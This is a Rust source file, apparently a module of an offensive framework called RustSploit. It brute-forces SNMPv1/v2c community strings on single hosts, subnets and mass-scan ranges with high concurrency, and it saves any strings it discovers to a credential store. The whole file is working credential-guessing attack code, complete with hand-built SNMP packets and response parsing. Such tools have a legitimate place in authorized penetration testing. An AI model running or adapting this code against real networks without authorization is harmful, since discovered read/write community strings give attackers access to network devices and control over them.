use anyhow::{anyhow, Result};
use colored::*;
use std::{
    io::Write,
    net::{IpAddr, SocketAddr},
    sync::Arc,
    time::Duration,
};


use crate::modules::creds::utils::{
    generate_combos_mode, ComboMode,
    is_mass_scan_target, is_subnet_target, run_bruteforce, run_mass_scan,
    run_subnet_bruteforce, BruteforceConfig, LoginResult, MassScanConfig, SubnetScanConfig,
};
use crate::utils::{
    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_output_file,
    cfg_prompt_port, cfg_prompt_yes_no, load_lines, normalize_target,
};

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "SNMP Brute Force".to_string(),
        description: "Brute-force SNMPv1/v2c community strings. Discovers read/write community strings on network devices with concurrent scanning and subnet/mass scan support.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

/// Prompt for SNMP version, returning 0 for v1 or 1 for v2c.
async fn prompt_snmp_version() -> Result<u8> {
    loop {
        let input = cfg_prompt_default("snmp_version", "SNMP Version (1 or 2c)", "2c").await?;
        match input.trim().to_lowercase().as_str() {
            "1" => return Ok(0),
            "2c" | "2" => return Ok(1),
            _ => crate::mprintln!("Invalid version. Enter '1' or '2c'."),
        }
    }
}

/// Format SNMP version byte as a display string.
fn version_label(v: u8) -> &'static str {
    if v == 0 {
        "v1"
    } else {
        "v2c"
    }
}

pub async fn run(target: &str) -> Result<()> {
    crate::mprintln!(
        "\n{}",
        "=== SNMPv1/v2c Brute Force Module ===".bold().cyan()
    );
    crate::mprintln!("{}", "    Community String Discovery Tool".cyan());
    crate::mprintln!();
    crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());

    // --- Mass scan mode ---
    if is_mass_scan_target(target) {
        crate::mprintln!("{}", "[*] Mode: Mass Scan / Hose".yellow());

        let communities_file =
            cfg_prompt_existing_file("community_wordlist", "Community string wordlist").await?;
        let snmp_version = prompt_snmp_version().await?;
        let communities = Arc::new(load_lines(&communities_file)?);
        if communities.is_empty() {
            return Err(anyhow!("Community wordlist cannot be empty"));
        }
        let timeout_secs =
            cfg_prompt_int_range("timeout", "Timeout (seconds)", 3, 1, 300).await? as u64;

        let cfg = MassScanConfig {
            protocol_name: "SNMP",
            default_port: 161,
            state_file: "snmp_hose_state.log",
            default_output: "snmp_mass_results.txt",
            default_concurrency: 500,
        };

        return run_mass_scan(target, cfg, move |ip: IpAddr, port: u16| {
            let communities = communities.clone();
            async move {
                let addr = format!("{}:{}", ip, port);
                let timeout = Duration::from_secs(timeout_secs);
                for community in communities.iter() {
                    match try_snmp_community(&addr, community, snmp_version, timeout).await {
                        Ok(true) => {
                            let now = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                            let line = format!("[{}] {}:{}\n", now, ip, community);
                            crate::mprintln!(
                                "\r{}",
                                format!("[+] FOUND: {} -> community: '{}'", addr, community)
                                    .green()
                                    .bold()
                            );
                            return Some(line);
                        }
                        Ok(false) => {}
                        Err(_) => return None,
                    }
                }
                None
            }
        })
        .await;
    }

    // --- Subnet scan mode (SNMP-specific, UDP — no TCP pre-check) ---
    if is_subnet_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());
        return run_subnet_scan(target).await;
    }

    // --- Single-target bruteforce via the generic engine ---

    let port = cfg_prompt_port("port", "SNMP Port", 161).await?;
    let communities_file =
        cfg_prompt_existing_file("community_wordlist", "Community string wordlist file path")
            .await?;
    let snmp_version = prompt_snmp_version().await?;
    let concurrency =
        cfg_prompt_int_range("concurrency", "Max concurrent tasks", 50, 1, 1000).await? as usize;
    let stop_on_success =
        cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
    let output_file =
        cfg_prompt_output_file("output_file", "Output file", "snmp_results.txt").await?;
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let timeout_secs =
        cfg_prompt_int_range("timeout", "Timeout (seconds)", 3, 1, 300).await? as u64;

    let norm_target = normalize_target(target)?;

    let communities = load_lines(&communities_file)?;
    if communities.is_empty() {
        crate::mprintln!("[!] Community wordlist is empty. Exiting.");
        return Ok(());
    }
    crate::mprintln!(
        "{}",
        format!("[*] Loaded {} community strings", communities.len()).cyan()
    );
    crate::mprintln!("[*] SNMP Version: {}", version_label(snmp_version));

    // Build combos: empty username, community string as password.
    let empty_users = vec![String::new()];
    let combos = generate_combos_mode(&empty_users, &communities, ComboMode::Combo);

    let config = BruteforceConfig {
        target: norm_target.clone(),
        port,
        concurrency,
        stop_on_success,
        verbose,
        delay_ms: 10,
        max_retries: 2,
        service_name: "snmp",
        jitter_ms: 0,
        source_module: "creds/generic/snmp_bruteforce",
    };

    let timeout = Duration::from_secs(timeout_secs);

    // The try_login closure adapts SNMP community-string testing to the
    // engine's (target, port, user, password) interface.  On success it
    // stores the credential with CredType::Key (SNMP community strings
    // are keys, not passwords).  The engine also stores with
    // CredType::Password — a harmless duplicate that keeps the generic
    // engine simple.
    let result = run_bruteforce(
        &config,
        combos,
        move |target: String, port: u16, _user: String, community: String| {
            let timeout = timeout;
            async move {
                let addr = format!("{}:{}", target, port);
                match try_snmp_community(&addr, &community, snmp_version, timeout).await {
                    Ok(true) => {
                        // Store with CredType::Key for SNMP semantics
                        {
                            let id = crate::cred_store::store_credential(
                                &target,
                                port,
                                "snmp",
                                "",
                                &community,
                                crate::cred_store::CredType::Key,
                                "creds/generic/snmp_bruteforce",
                            )
                            .await;
                            if id.is_empty() { crate::meprintln!("[!] Failed to store credential"); }
                        }
                        LoginResult::Success
                    }
                    Ok(false) => LoginResult::AuthFailed,
                    Err(e) => LoginResult::Error {
                        message: e.to_string(),
                        retryable: true,
                    },
                }
            }
        },
    )
    .await?;

    // Print results — adapt the engine's generic output for SNMP display
    if result.found.is_empty() {
        crate::mprintln!("{}", "[-] No valid community strings found.".yellow());
    } else {
        crate::mprintln!(
            "{}",
            format!(
                "[+] Found {} valid community string(s):",
                result.found.len()
            )
            .green()
            .bold()
        );
        if let Ok(mut file) = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&output_file)
        {
            for (host, _user, community) in &result.found {
                crate::mprintln!("     {} -> community: '{}'", host, community);
                if let Err(e) = writeln!(file, "{} -> community: '{}'", host, community) { crate::meprintln!("[!] Write error: {}", e); }
            }
            crate::mprintln!("[+] Results saved to '{}'", output_file);
        }
    }

    Ok(())
}

/// Try an SNMP community string via async UDP (no spawn_blocking overhead).
async fn try_snmp_community(
    normalized_addr: &str,
    community: &str,
    version: u8, // 0 = v1, 1 = v2c
    timeout: Duration,
) -> Result<bool> {
    let addr: SocketAddr = normalized_addr
        .parse()
        .map_err(|e| anyhow!("Invalid address '{}': {}", normalized_addr, e))?;

    // Async UDP socket
    let socket = crate::utils::udp_bind(None).await
        .map_err(|e| anyhow!("Failed to bind UDP socket: {}", e))?;

    let message = build_snmp_get_request(community, version);

    // Send SNMP GET request
    socket
        .send_to(&message, &addr)
        .await
        .map_err(|e| anyhow!("Failed to send SNMP request: {}", e))?;

    // Receive response with timeout
    let mut buf = vec![0u8; 4096];
    match tokio::time::timeout(timeout, socket.recv_from(&mut buf)).await {
        Ok(Ok((size, _))) => {
            let response = &buf[..size];
            if size >= 20 && response[0] == 0x30 {
                match parse_snmp_response(response) {
                    Ok(valid) => Ok(valid),
                    Err(_) => Ok(false),
                }
            } else {
                Ok(false)
            }
        }
        Ok(Err(_)) | Err(_) => Ok(false), // Timeout or recv error = invalid community
    }
}

/// Parses SNMP response to check if error status is 0 (noError)
/// Returns Ok(true) if valid, Ok(false) if error status != 0, Err if can't parse
fn parse_snmp_response(response: &[u8]) -> Result<bool> {
    if response.len() < 20 || response[0] != 0x30 {
        return Err(anyhow!("Invalid SNMP response header"));
    }

    // Try to find the PDU (GetResponse-PDU = 0xa2)
    // The structure is: SEQUENCE (version, community, PDU)
    // We need to skip version and community to get to the PDU

    let mut pos = 1;

    // Skip length of outer SEQUENCE
    if pos >= response.len() {
        return Err(anyhow!("Response too short"));
    }
    let (_len, len_bytes) = parse_ber_length(&response[pos..])?;
    pos += len_bytes;

    // Skip version (INTEGER)
    if pos >= response.len() || response[pos] != 0x02 {
        return Err(anyhow!("Invalid version field"));
    }
    pos += 1;
    let (vlen, vlen_bytes) = parse_ber_length(&response[pos..])?;
    pos += vlen_bytes + vlen;

    // Skip community (OCTET STRING)
    if pos >= response.len() || response[pos] != 0x04 {
        return Err(anyhow!("Invalid community field"));
    }
    pos += 1;
    let (clen, clen_bytes) = parse_ber_length(&response[pos..])?;
    pos += clen_bytes + clen;

    // Now we should be at the PDU
    // GetResponse-PDU = 0xa2, GetRequest-PDU = 0xa0
    if pos >= response.len() {
        return Err(anyhow!("Response too short for PDU"));
    }

    let pdu_tag = response[pos];
    if pdu_tag != 0xa2 && pdu_tag != 0xa0 {
        // Not a GetResponse or GetRequest, might be an error
        return Ok(false);
    }

    pos += 1;
    let (_pdu_len, pdu_len_bytes) = parse_ber_length(&response[pos..])?;
    pos += pdu_len_bytes;

    // PDU structure: request-id, error-status, error-index, variable-bindings
    // Skip request-id (INTEGER)
    if pos >= response.len() || response[pos] != 0x02 {
        return Err(anyhow!("Invalid request-id field"));
    }
    pos += 1;
    let (rid_len, rid_len_bytes) = parse_ber_length(&response[pos..])?;
    pos += rid_len_bytes + rid_len;

    // Read error-status (INTEGER)
    if pos >= response.len() || response[pos] != 0x02 {
        return Err(anyhow!("Invalid error-status field"));
    }
    pos += 1;
    let (es_len, es_len_bytes) = parse_ber_length(&response[pos..])?;
    if es_len == 0 || pos + es_len_bytes + es_len > response.len() {
        return Err(anyhow!("Invalid error-status length"));
    }

    // Read the error status value
    let error_status = if es_len == 1 {
        response[pos + es_len_bytes] as u32
    } else {
        // Multi-byte integer (shouldn't happen for error status, but handle it)
        let mut val = 0u32;
        for i in 0..es_len {
            val = (val << 8) | (response[pos + es_len_bytes + i] as u32);
        }
        val
    };

    // Error status 0 = noError, anything else is an error
    Ok(error_status == 0)
}

/// Parses BER length field
/// Returns (length_value, number_of_bytes_consumed)
fn parse_ber_length(data: &[u8]) -> Result<(usize, usize)> {
    if data.is_empty() {
        return Err(anyhow!("Empty length field"));
    }

    let first_byte = data[0];

    if (first_byte & 0x80) == 0 {
        // Short form: single byte
        Ok((first_byte as usize, 1))
    } else {
        // Long form: first byte indicates number of length bytes
        let num_bytes = (first_byte & 0x7F) as usize;
        if num_bytes == 0 {
            return Err(anyhow!("Indefinite length not supported"));
        }
        if num_bytes > 4 {
            return Err(anyhow!("Length field too large"));
        }
        if data.len() < 1 + num_bytes {
            return Err(anyhow!("Not enough bytes for length field"));
        }

        let mut length = 0usize;
        for i in 0..num_bytes {
            length = (length << 8) | (data[1 + i] as usize);
        }

        Ok((length, 1 + num_bytes))
    }
}

/// Builds a simple SNMP GET request packet manually
/// This is a simplified implementation that creates a basic SNMPv1/v2c GET request
fn build_snmp_get_request(community: &str, version: u8) -> Vec<u8> {
    // Build components first, then assemble with proper length encoding

    // OID for sysDescr: 1.3.6.1.2.1.1.1.0
    let oid_encoded = encode_oid_value(&[1, 3, 6, 1, 2, 1, 1, 1, 0]);
    let oid_tlv = build_tlv(0x06, &oid_encoded); // 0x06 = OBJECT IDENTIFIER

    // NULL value
    let null_tlv = vec![0x05, 0x00]; // NULL type, length 0

    // VarBind: SEQUENCE of (OID, NULL)
    let mut var_bind = Vec::new();
    var_bind.extend_from_slice(&oid_tlv);
    var_bind.extend_from_slice(&null_tlv);
    let var_bind_tlv = build_tlv(0x30, &var_bind); // 0x30 = SEQUENCE

    // VarBindList: SEQUENCE of VarBind
    let mut var_bind_list_content = Vec::new();
    var_bind_list_content.extend_from_slice(&var_bind_tlv);
    let var_bind_list_tlv = build_tlv(0x30, &var_bind_list_content); // 0x30 = SEQUENCE

    // Request ID
    let request_id_tlv = encode_integer_tlv(1u32);

    // Error status (0 = noError)
    let error_status_tlv = encode_integer_tlv(0u32);

    // Error index (0 = noError)
    let error_index_tlv = encode_integer_tlv(0u32);

    // PDU: GetRequest-PDU
    let mut pdu_content = Vec::new();
    pdu_content.extend_from_slice(&request_id_tlv);
    pdu_content.extend_from_slice(&error_status_tlv);
    pdu_content.extend_from_slice(&error_index_tlv);
    pdu_content.extend_from_slice(&var_bind_list_tlv);
    let pdu_tlv = build_tlv(0xa0, &pdu_content); // 0xa0 = GetRequest-PDU

    // Version
    let version_tlv = encode_integer_tlv(version as u32);

    // Community string
    let community_bytes = community.as_bytes();
    let community_tlv = build_tlv(0x04, community_bytes); // 0x04 = OCTET STRING

    // SNMP Message: SEQUENCE of (version, community, PDU)
    let mut message_content = Vec::new();
    message_content.extend_from_slice(&version_tlv);
    message_content.extend_from_slice(&community_tlv);
    message_content.extend_from_slice(&pdu_tlv);
    build_tlv(0x30, &message_content) // 0x30 = SEQUENCE
}

/// Builds a TLV (Type-Length-Value) structure
fn build_tlv(tag: u8, value: &[u8]) -> Vec<u8> {
    let mut result = Vec::new();
    result.push(tag);

    let length = value.len();
    if length < 128 {
        // Short form: single byte length
        result.push(length as u8);
    } else {
        // Long form: first byte is 0x80 | num_bytes, followed by length bytes (big-endian)
        // Calculate how many bytes we need for the length
        let mut len = length;
        let mut num_bytes = 0;
        let mut len_bytes = Vec::new();

        while len > 0 {
            len_bytes.push((len & 0xFF) as u8);
            len >>= 8;
            num_bytes += 1;
        }

        // Reverse to get big-endian representation
        len_bytes.reverse();

        // First byte: 0x80 | number of length bytes
        result.push(0x80 | (num_bytes as u8));
        result.extend_from_slice(&len_bytes);
    }

    result.extend_from_slice(value);
    result
}

/// Encodes an integer as a TLV (signed integer, but we use it for unsigned values)
fn encode_integer_tlv(value: u32) -> Vec<u8> {
    let mut bytes = Vec::new();
    if value == 0 {
        bytes.push(0);
    } else {
        let mut val = value;
        // Encode as big-endian, using minimum number of bytes
        // For values that would have high bit set, we need an extra zero byte
        // to ensure it's interpreted as positive
        while val > 0 {
            bytes.push((val & 0xFF) as u8);
            val >>= 8;
        }
        bytes.reverse();

        // If high bit is set, prepend 0x00 to make it positive
        if bytes[0] & 0x80 != 0 {
            bytes.insert(0, 0x00);
        }
    }
    build_tlv(0x02, &bytes) // 0x02 = INTEGER
}

/// Encodes OID value (without the TLV wrapper)
fn encode_oid_value(oid: &[u32]) -> Vec<u8> {
    let mut encoded = Vec::new();
    if oid.len() >= 2 {
        // First two sub-identifiers are encoded as: first * 40 + second
        encoded.push((oid[0] * 40 + oid[1]) as u8);
        for &sub_id in &oid[2..] {
            encode_sub_id(sub_id, &mut encoded);
        }
    }
    encoded
}

/// Encodes a sub-identifier using base-128 encoding
fn encode_sub_id(mut value: u32, output: &mut Vec<u8>) {
    let mut bytes = Vec::new();
    if value == 0 {
        bytes.push(0);
    } else {
        while value > 0 {
            bytes.push((value & 0x7F) as u8);
            value >>= 7;
        }
        bytes.reverse();
        // Set high bit on all but last byte
        for i in 0..bytes.len() - 1 {
            bytes[i] |= 0x80;
        }
    }
    output.extend_from_slice(&bytes);
}

async fn run_subnet_scan(target: &str) -> Result<()> {
    let port = cfg_prompt_port("port", "SNMP Port", 161).await?;
    let communities_file =
        cfg_prompt_existing_file("community_wordlist", "Community string wordlist").await?;
    let snmp_version = prompt_snmp_version().await?;
    let communities = load_lines(&communities_file)?;
    if communities.is_empty() {
        return Err(anyhow!("Community wordlist empty"));
    }

    let concurrency =
        cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000).await? as usize;
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let timeout_secs =
        cfg_prompt_int_range("timeout", "Timeout (seconds)", 3, 1, 300).await? as u64;
    let output_file = cfg_prompt_output_file(
        "output_file",
        "Output result file",
        "snmp_subnet_results.txt",
    )
    .await?;

    // SNMP uses community strings, not user/pass pairs.
    // Map: empty username, community string as password.
    let empty_users = vec![String::new()];
    let timeout = Duration::from_secs(timeout_secs);

    run_subnet_bruteforce(
        target,
        port,
        empty_users,
        communities,
        &SubnetScanConfig {
            concurrency,
            verbose,
            output_file,
            service_name: "snmp",
            jitter_ms: 0,
            source_module: "creds/generic/snmp_bruteforce",
            skip_tcp_check: true, // SNMP is UDP — no TCP pre-check
        },
        move |ip: IpAddr, port: u16, _user: String, community: String| {
            let timeout = timeout;
            async move {
                let addr = format!("{}:{}", ip, port);
                match try_snmp_community(&addr, &community, snmp_version, timeout).await {
                    Ok(true) => {
                        // Store with CredType::Key for SNMP semantics
                        {
                            let id = crate::cred_store::store_credential(
                                &ip.to_string(),
                                port,
                                "snmp",
                                "",
                                &community,
                                crate::cred_store::CredType::Key,
                                "creds/generic/snmp_bruteforce",
                            )
                            .await;
                            if id.is_empty() { crate::meprintln!("[!] Failed to store credential"); }
                        }
                        LoginResult::Success
                    }
                    Ok(false) => LoginResult::AuthFailed,
                    Err(e) => LoginResult::Error {
                        message: e.to_string(),
                        retryable: false, // UDP timeout = host not responding
                    },
                }
            }
        },
    )
    .await
}
